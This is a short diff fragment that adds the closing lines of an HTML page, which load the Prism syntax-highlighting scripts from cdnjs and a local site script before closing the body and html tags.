+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+<script src="assets/js/site.js"></script>
+</body>
+</html>
